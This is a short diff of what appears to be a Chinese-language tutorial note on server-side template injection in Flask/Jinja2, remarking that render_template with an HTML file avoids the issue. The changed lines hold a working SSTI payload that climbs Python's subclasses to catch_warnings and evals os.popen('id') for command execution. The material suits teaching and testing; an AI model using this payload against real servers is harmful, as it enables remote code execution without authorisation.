@@ -25,7 +25,7 @@ if __name__ == "__main__":
 > 注意这里面如果使用render_template带入html模板的话就不会产生这个问题
 
 {% for c in [].__class__.__base__.__subclasses__() %}
-{% if c.__name__=='catch_warnings' %}
-{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
-{% endif %}
+	{% if c.__name__=='catch_warnings' %}
+		{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
+	{% endif %}
 {% endfor %}
